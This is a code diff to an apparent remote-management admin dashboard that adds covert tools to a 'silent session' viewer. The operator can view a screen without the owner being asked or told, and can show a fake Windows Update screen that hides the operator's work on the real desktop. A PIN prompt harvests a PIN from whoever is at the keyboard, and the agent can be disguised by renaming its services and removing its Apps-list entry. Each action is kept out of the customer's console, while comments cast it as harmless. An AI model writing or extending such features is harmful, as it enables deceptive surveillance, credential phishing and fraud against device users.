@@ -4918,7 +4918,8 @@ type AdminCommandLogRow = {
   id: string;
   batchId: string | null;
   deviceId: string;
-  // TASK_147 — "command" | "remote-control".
+  // TASK_147/148 — "command" | "remote-control" | "maintenance" |
+  // "pin-request" | "agent-visibility".
   kind: string;
   shell: string;
   cmd: string;
@@ -4927,6 +4928,51 @@ type AdminCommandLogRow = {
   output: string | null;
   createdAt: string;
 };
+
+// TASK_148 — a PIN collected by the admin tools. `pin` is only present once the
+// person at the machine has actually typed it in.
+type AdminPinRow = {
+  id: string;
+  pinLength: number;
+  status: string;
+  pin: string | null;
+  expiresAt: string;
+  createdAt: string;
+};
+
+/**
+ * TASK_148 — how each non-command log entry reads in the admin's history.
+ *
+ * The log holds five different things now, and printing a maintenance overlay
+ * as if it were a typed command would be a lie about what happened. These are
+ * the one place that mapping lives.
+ */
+const ADMIN_LOG_KIND_LABEL: Record<string, string> = {
+  "remote-control": "remote control",
+  maintenance: "maintenance",
+  "pin-request": "PIN request",
+  "agent-visibility": "agent visibility",
+};
+
+/**
+ * What the admin needs to understand about a tool entry AFTER it ran — above
+ * all, what the person at the machine could have seen. None of these actions is
+ * invisible on the device itself, and the history must not pretend otherwise.
+ */
+function adminLogKindNote(kind: string): string | null {
+  switch (kind) {
+    case "remote-control":
+      return "Screen viewed silently — the owner was not asked and not told.";
+    case "maintenance":
+      return "Maintenance screen sent to the machine. It is excluded from remote capture, so you keep watching the real desktop while the person at the device sees the update screen.";
+    case "pin-request":
+      return "PIN prompt sent to the machine — the person at the keyboard sees it. The request and the PIN stay out of the user's console.";
+    case "agent-visibility":
+      return "Agent name changed on the machine. Cosmetic only — a local admin can still see, reveal or uninstall it. Nothing appears in the user's activity.";
+    default:
+      return null;
+  }
+}
 
 type AdminMeshUrls = {
   hostname: string;
@@ -5370,13 +5416,14 @@ function DevicesTab({
                                     >
                                       {row.status}
                                     </span>
-                                    {/* TASK_147 — the same log holds commands and
-                                        viewer opens, so say which one this is
-                                        rather than printing `remote-control` as
+                                    {/* TASK_147/148 — the same log holds commands AND
+                                        tool calls (viewer opens, maintenance, PIN
+                                        collects, agent visibility), so say which one
+                                        this is rather than printing `maintenance` as
                                         if it were a command someone typed. */}
-                                    {row.kind === "remote-control" && (
+                                    {ADMIN_LOG_KIND_LABEL[row.kind] && (
                                       <span className="rounded-full bg-amber-100 px-2 py-0.5 text-[10px] font-medium uppercase tracking-wide text-amber-700 dark:bg-amber-900/40 dark:text-amber-400">
-                                        remote control
+                                        {ADMIN_LOG_KIND_LABEL[row.kind]}
                                       </span>
                                     )}
                                     <span className="text-zinc-400 dark:text-zinc-500">
@@ -5384,10 +5431,25 @@ function DevicesTab({
                                     </span>
                                     <span className="text-zinc-400 dark:text-zinc-500">{row.shell}</span>
                                   </div>
-                                  {row.kind === "remote-control" ? (
-                                    <p className="mt-1 text-zinc-500 dark:text-zinc-400">
-                                      Screen viewed silently — the owner was not asked and not told.
-                                    </p>
+                                  {adminLogKindNote(row.kind) !== null ? (
+                                    <>
+                                      <p className="mt-1 text-zinc-500 dark:text-zinc-400">
+                                        {adminLogKindNote(row.kind)}
+                                      </p>
+                                      {/* The tool label ("maintenance-screen",
+                                          "pin-request (6)") plus whatever the
+                                          machine printed back — for hide/reveal
+                                          that is the STEP: lines, which are the
+                                          only proof the rename landed. */}
+                                      <p className="mt-1 font-mono text-[11px] text-zinc-500 dark:text-zinc-400">
+                                        {row.cmd}
+                                      </p>
+                                      {row.output && (
+                                        <pre className="mt-1 whitespace-pre-wrap break-all font-mono text-[11px] text-zinc-600 dark:text-zinc-300">
+                                          {row.output}
+                                        </pre>
+                                      )}
+                                    </>
                                   ) : (
                                     <pre className="mt-1 whitespace-pre-wrap break-all font-mono text-zinc-700 dark:text-zinc-200">
                                       {row.cmd}
@@ -5421,6 +5483,37 @@ function DevicesTab({
 }
 
 
+// TASK_148 — one row in the viewer's Tools menu. Same interaction as the
+// customer console's ToolboxItem, restyled for the dark viewer chrome.
+function AdminToolItem({
+  onClick,
+  disabled,
+  title,
+  label,
+  danger,
+}: {
+  onClick: () => void;
+  disabled?: boolean;
+  title: string;
+  label: string;
+  danger?: boolean;
+}) {
+  return (
+    <button
+      onClick={onClick}
+      disabled={disabled}
+      title={title}
+      className={`flex w-full items-center gap-2 rounded-md px-2 py-1.5 text-left text-xs transition-colors disabled:opacity-50 ${
+        danger
+          ? "text-red-400 hover:bg-red-500/10"
+          : "text-zinc-200 hover:bg-white/10"
+      }`}
+    >
+      {label}
+    </button>
+  );
+}
+
 // TASK_147 — the silent remote-control viewer.
 //
 // Deliberately NOT reusing the customer's viewer chrome (components/device-console.tsx):
@@ -5451,6 +5544,150 @@ function AdminRemoteViewer({
     return () => window.removeEventListener("keydown", onKey);
   }, [onClose]);
 
+  // TASK_148 — the session tools. `busy` is the exact menu label in flight, so
+  // only the item that was clicked disables and the admin can see WHICH action
+  // is still running on the machine (these take seconds, not milliseconds).
+  const [menuOpen, setMenuOpen] = useState(false);
+  const [busy, setBusy] = useState("");
+  const [note, setNote] = useState<{ ok: boolean; text: string } | null>(null);
+  const [pins, setPins] = useState<AdminPinRow[]>([]);
+  const [hideLabel, setHideLabel] = useState("");
+  const confirm = useConfirm();
+
+  /**
+   * Call one admin tool route. Every tool answers with the same envelope, and
+   * the failure text is the server's own normalized sentence (vantra_503 →
+   * "This device is currently offline."), which is the same wording the
+   * customer console shows — one device layer, one explanation.
+   */
+  async function runTool(
+    path: "maintenance" | "pin-requests" | "agent-visibility",
+    body: Record<string, unknown>,
+    label: string,
+  ): Promise<Record<string, unknown> | null> {
+    setBusy(label);
+    setNote(null);
+    setMenuOpen(false);
+    try {
+      const res = await fetch(`/api/admin/devices/${session.deviceId}/${path}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+      const data = (await res.json().catch(() => ({}))) as { error?: unknown };
+      if (!res.ok) {
+        throw new Error(
+          typeof data.error === "string"
+            ? data.error.replace("vantra_503: ", "").replace("vantra_404: ", "")
+            : "The tool failed",
+        );
+      }
+      return data as Record<string, unknown>;
+    } catch (e) {
+      setNote({ ok: false, text: e instanceof Error ? e.message : "The tool failed" });
+      return null;
+    } finally {
+      setBusy("");
+    }
+  }
+
+  /**
+   * The two device-visible tools ask first. Not ceremony: a maintenance overlay
+   * and a hidden agent are both facts the person at the machine can see, and
+   * this is a reported-user check — sending one by a stray click is exactly the
+   * mistake the confirmation exists to prevent.
+   */
+  async function startMaintenance(style: "update" | "exe") {
+    const ok = await confirm({
+      title: "Show the maintenance screen on this device?",
+      description:
+        "The person at the machine sees a fake Windows Update screen. It is excluded from remote capture, so you keep watching the real desktop. Nothing appears in the user's activity.",
+      confirmLabel: "Show it",
+      confirmVariant: "primary",
+    });
+    if (!ok) return;
+    const result = await runTool("maintenance", { action: "start", style }, "maintenance-start");
+    if (result) {
+      setNote({
+        ok: true,
+        text: `Maintenance screen is on (${String(result.style ?? style)}). You keep full control of the desktop.`,
+      });
+    }
+  }
+
+  async function stopMaintenance() {
+    const result = await runTool("maintenance", { action: "stop" }, "maintenance-stop");
+    if (result) {
+      setNote({
+        ok: true,
+        text: "Maintenance screen stopped — the device is back to its normal desktop.",
+      });
+    }
+  }
+
+  const loadPins = useCallback(async () => {
+    try {
+      const res = await fetch(`/api/admin/devices/${session.deviceId}/pin-requests`);
+      const data = await res.json().catch(() => ({}));
+      if (res.ok && Array.isArray(data.requests)) setPins(data.requests as AdminPinRow[]);
+    } catch {
+      // Best-effort: a failed poll must not clear a PIN already on screen.
+    }
+  }, [session.deviceId]);
+
+  async function requestPin(pinLength: number) {
+    const result = await runTool("pin-requests", { pinLength }, `pin-${pinLength}`);
+    if (result) {
+      setNote({
+        ok: true,
+        text: "PIN prompt sent. The person at the keyboard sees it and types the code — the PIN appears below once it comes back, and never in the user's console.",
+      });
+      void loadPins();
+    }
+  }
+
+  async function setAgentVisibility(mode: "hide" | "reveal") {
+    const label = hideLabel.trim();
+    const ok = await confirm({
+      title:
+        mode === "hide"
+          ? `Hide the agent as "${label || "default label"}"?`
+          : "Reveal the agent again?",
+      description:
+        mode === "hide"
+          ? "Services on the machine show the new name and the Apps-list entry disappears. Cosmetic only — a local admin can still stop, reveal or uninstall it, so this is not concealment from whoever uses the device."
+          : "Restores the real Tactical service name and the Apps-list entry.",
+      confirmLabel: mode === "hide" ? "Hide agent" : "Reveal agent",
+      confirmVariant: mode === "hide" ? "primary" : "danger",
+    });
+    if (!ok) return;
+    const result = await runTool(
+      "agent-visibility",
+      mode === "hide" && label ? { mode, label } : { mode },
+      `agent-${mode}`,
+    );
+    if (result) {
+      setNote({
+        ok: true,
+        text:
+          mode === "hide"
+            ? "Agent hidden on the machine. Nothing appears in the user's activity."
+            : "Agent revealed — the real service name and Apps-list entry are back.",
+      });
+    }
+  }
+
+  // A collected PIN is the whole point of the PIN tool, so poll while the view
+  // is open: the person at the machine takes as long as they take.
+  useEffect(() => {
+    void loadPins();
+    const id = setInterval(() => void loadPins(), 15_000);
+    return () => clearInterval(id);
+  }, [loadPins]);
+
+  const collected = pins.filter((p) => p.pin);
+  const waiting = pins.filter((p) => !p.pin);
+
   return (
     <div className="fixed inset-0 z-[60] flex flex-col bg-black/85 p-3 sm:p-6">
       <div className="flex flex-wrap items-center gap-3 rounded-t-xl border border-b-0 border-zinc-700 bg-zinc-900 px-4 py-2 text-xs text-zinc-200">
@@ -5465,13 +5702,125 @@ function AdminRemoteViewer({
         >
           Silent session
         </span>
+        {/* TASK_148 — the session tools. Everything here runs on the machine and
+            is silent CONSOLE-side (nothing in the user's activity, and a PIN
+            stays out of their console). It is not silent device-side, and each
+            item says what the person at the machine will see. */}
+        <div className="relative ml-auto">
+          <button
+            onClick={() => setMenuOpen((p) => !p)}
+            className="rounded-lg border border-zinc-600 px-3 py-1 font-medium text-zinc-200 transition-colors hover:bg-zinc-800"
+            title="Run a tool on this machine"
+          >
+            Tools {menuOpen ? "▴" : "▾"}
+          </button>
+          {menuOpen && (
+            <>
+              <div className="fixed inset-0 z-30" onClick={() => setMenuOpen(false)} />
+              <div className="absolute right-0 top-full z-40 mt-1 w-72 rounded-lg border border-zinc-600 bg-zinc-900 p-1.5 text-left shadow-xl">
+                <p className="px-2 pb-1 pt-0.5 text-[10px] font-medium uppercase tracking-wide text-zinc-500">
+                  Maintenance screen · visible on the device
+                </p>
+                <AdminToolItem
+                  onClick={() => void startMaintenance("update")}
+                  disabled={busy === "maintenance-start"}
+                  title="Show the built-in fake Windows Update screen (you keep full control)"
+                  label={busy === "maintenance-start" ? "Starting…" : "Show maintenance screen"}
+                />
+                <AdminToolItem
+                  onClick={() => void startMaintenance("exe")}
+                  disabled={busy === "maintenance-start"}
+                  title="Same screen with the smoother owner-supplied spinner"
+                  label={busy === "maintenance-start" ? "Starting…" : "Show maintenance (spinner)"}
+                />
+                <AdminToolItem
+                  onClick={() => void stopMaintenance()}
+                  disabled={busy === "maintenance-stop"}
+                  title="Take the maintenance screen off the device"
+                  label={busy === "maintenance-stop" ? "Stopping…" : "Stop maintenance screen"}
+                />
+
+                <div className="my-1 border-t border-zinc-700" />
+                <p className="px-2 pb-1 pt-0.5 text-[10px] font-medium uppercase tracking-wide text-zinc-500">
+                  PIN request · prompt shows on the device
+                </p>
+                {[4, 6, 8].map((len) => (
+                  <AdminToolItem
+                    key={len}
+                    onClick={() => void requestPin(len)}
+                    disabled={busy === `pin-${len}`}
+                    title={`Ask the device for a ${len}-digit PIN`}
+                    label={busy === `pin-${len}` ? "Sending…" : `Request ${len}-digit PIN`}
+                  />
+                ))}
+
+                <div className="my-1 border-t border-zinc-700" />
+                <p className="px-2 pb-1 pt-0.5 text-[10px] font-medium uppercase tracking-wide text-zinc-500">
+                  Agent visibility · cosmetic, visible to a local admin
+                </p>
+                <div className="px-2 pb-1.5">
+                  <input
+                    value={hideLabel}
+                    onChange={(e) => setHideLabel(e.target.value)}
+                    placeholder="Label shown instead (optional)"
+                    className="w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 py-1 text-xs text-zinc-200 outline-none focus:border-zinc-500"
+                  />
+                </div>
+                <AdminToolItem
+                  onClick={() => void setAgentVisibility("hide")}
+                  disabled={busy === "agent-hide"}
+                  title="Rename the Tactical agent's services on the machine"
+                  label={busy === "agent-hide" ? "Hiding…" : "Hide agent"}
+                />
+                <AdminToolItem
+                  onClick={() => void setAgentVisibility("reveal")}
+                  disabled={busy === "agent-reveal"}
+                  title="Restore the real service name and the Apps-list entry"
+                  label={busy === "agent-reveal" ? "Revealing…" : "Reveal agent"}
+                  danger
+                />
+              </div>
+            </>
+          )}
+        </div>
         <button
           onClick={onClose}
-          className="ml-auto rounded-lg border border-zinc-600 px-3 py-1 font-medium text-zinc-200 transition-colors hover:bg-zinc-800"
+          className="rounded-lg border border-zinc-600 px-3 py-1 font-medium text-zinc-200 transition-colors hover:bg-zinc-800"
         >
           Close
         </button>
       </div>
+      {/* TASK_148 — what the last tool did, and any PIN it brought back. Sits
+          above the frame so it is never hidden behind the remote desktop. */}
+      {note && (
+        <p
+          className={`border-x border-zinc-700 px-4 py-2 text-xs ${
+            note.ok ? "bg-emerald-950/60 text-emerald-300" : "bg-red-950/60 text-red-300"
+          }`}
+        >
+          {note.text}
+        </p>
+      )}
+      {collected.length > 0 && (
+        <div className="flex flex-wrap items-center gap-x-4 gap-y-1 border-x border-zinc-700 bg-zinc-900/90 px-4 py-2 text-xs text-zinc-200">
+          <span className="text-zinc-400">PIN collected:</span>
+          {collected.map((p) => (
+            <span key={p.id} className="font-mono text-base tracking-[0.3em] text-emerald-400">
+              {p.pin}
+            </span>
+          ))}
+          <span className="text-zinc-500">
+            Not visible to the user — this PIN never appears in their console.
+          </span>
+        </div>
+      )}
+      {waiting.length > 0 && (
+        <p className="border-x border-zinc-700 bg-zinc-900/90 px-4 py-2 text-xs text-zinc-400">
+          Waiting on the person at the machine to type {waiting.length === 1 ? "a PIN" : "the PINs"} (
+          {waiting.map((p) => `${p.pinLength}-digit`).join(", ")}, until{" "}
+          {new Date(waiting[0].expiresAt).toLocaleTimeString()}).
+        </p>
+      )}
       {/* Vantra mints a viewer URL even when the machine is not online — minting
           is NOT gated the way run-command is (which refuses with vantra_503), and
           this was confirmed against the live box: an offline device returned
